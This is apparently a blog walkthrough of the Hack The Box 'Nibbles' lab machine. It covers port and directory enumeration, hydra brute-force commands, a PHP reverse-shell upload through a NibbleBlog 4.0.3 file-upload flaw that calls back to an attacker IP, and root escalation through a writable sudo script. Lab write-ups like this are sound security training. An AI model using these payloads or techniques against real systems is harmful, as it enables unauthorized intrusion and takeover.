---
title: "HTB - Nibbles"
categories: [box]
date: 2022-11-01
comments: true
image: /images/walkthroughs/hackthebox/nibbles/logo.png
favicon: /images/walkthroughs/hackthebox/nibbles/logo.png
description: HTB - Nibbles walkthrough
---

# Nibbles

<p align="center">
  <img src="/images/walkthroughs/hackthebox/nibbles/banner.png" width="70%"/>
</p>


## Summary

Nibbles is an easy box where we have a vulnerable blog engine, NibbleBlog 4.0.3. To exploit this Arbitrary File Upload (a php revshell) we need to find credentials to access the platform. I spent most of the time looking for it. There are a couple directory listings where we can find username admin, but password was a bit tricky and guessy. You cant do bruteforce since the server blocks you, so solving this machine depends if you are able to guess the nibbles password. Once inside, we can upload our revshell and get the user flag.

For privilege escalation, we see that we can run sudo as root for a certain shell script. We can write that file, so we append a bash command at the very beggining. Then, execute the file and get the root shell.


## Enumeration

- nmap

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-03 17:18 EST
Nmap scan report for 10.129.96.84
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

nmap does not give too much information more than Ubuntu 16.04. Checking the website we see a comment that takes us to _nibbleblog_ path. Let's enumerate it with gobuster:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/nibbles/1_0_web.png" width="70%"/>
</p>

- gobuster

```bash
gobuster dir -u "http://10.129.96.84/nibbleblog" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.84/nibbleblog
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/12/03 17:21:55 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 323] [--> http://10.129.96.84/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 327] [--> http://10.129.96.84/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/plugins/]
/themes               (Status: 301) [Size: 324] [--> http://10.129.96.84/nibbleblog/themes/]
```

On _/admin_ we can see a list of directories being served:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/nibbles/1_1_admin.png" width="70%"/>
</p>


- Bruteforce:


```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.96.84 http-post-form "/nibbleblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.96.84 http-post-form "/nibbleblog/admin.php:username=admin&password=^PASS^:Incorrect"
```

After some time, we get blocked, so I end up trying some manual combinations until I found this (kinda guessy):

**admin:nibbles**


Once inside, we can exploit the Arbitrary File Upload vulnerability in my_image plugin, more info about the vuln [here](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html):

- Go to plugins > my image > configure:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/nibbles/2_1_my_images.png" width="90%"/>
</p>

- Create a PHP revshell to upload to the server:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/5454 0>&1'"); ?>
```

- Upload the payload:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/nibbles/2_2_image.png" width="90%"/>
</p>

- Visit the image at:

http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php

- Get the revshell:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/nibbles/2_3_rev.png" width="90%"/>
</p>

We can go to the user home directory and get the flag.


## Privesc

We can see a zip file in the same home directory called "personal.zip" so let's see if it hides something insteresting. It contains the following bash script:

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh 
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```

Apparently we can run sudo as root with no password for this script. We have all permissions over that file, so we can just inject a bash execution or a revshell to get a root shell:

```bash
nano monitor.sh

# Add the following line at the beginning:
bash -p

# Save the file and execute as root:
sudo monitor.sh

#Enjoy the root shell
```

My output was a mess so I clear the terminal and get the root flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/nibbles/4_0_root.png" width="70%"/>
</p>

